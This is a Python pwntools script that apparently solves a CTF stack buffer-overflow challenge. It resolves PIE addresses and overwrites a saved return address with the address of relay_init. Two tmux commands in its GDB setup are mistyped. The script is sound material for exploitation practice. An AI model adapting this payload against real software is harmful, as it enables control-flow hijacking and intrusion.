from pwn import *

# Load the binary file to analyze its symbols and sections
binary = ELF("/problems/stack3r-64_6_b4102fbcd5bc361d916ae5602ca212ce/stack3-64")

# Start the binary in GDB with specific breakpoints and commands
p = gdb.debug(binary.path, gdbscript="""
        b *main
        b relay_init
        b *relay_init+20
        shell tmux swap-plane -U
        shell tmux select-layer main-vertical  
        continue
""")

# Get the base address of the PIE (Position Independent Executable)
base_addr = p.libs().get(binary.path, None)

# Calculate the address of the relay_init function using the PIE base address
relay_init_addr = base_addr + binary.symbols['relay_init']

# Calculate the address of the _start function using the PIE base address
start_addr = base_addr + binary.symbols['_start']

# Print the calculated addresses for debugging purposes
print(f"[+] relay_init() address: {hex(relay_init_addr)}")
print(f"[+] _start() address: {hex(start_addr)}")

# determined with cyclic_find and some trial/error.
offset = 104  

# Create the payload to exploit the buffer overflow
payload = b"A" * offset  # Fill the buffer with 'A's up to the overflow point
payload += b"B" * 16  # Add padding to ensure proper stack alignment
payload += p64(relay_init_addr)  # Overwrite the return address with relay_init()
payload += p64(start_addr)  # Add a safe return address to _start()

# Print the payload for debugging purposes
print(f"payload: {payload}")

# Send the payload to the program
p.sendline(payload)

# Interact with the program after sending the payload
p.interactive()
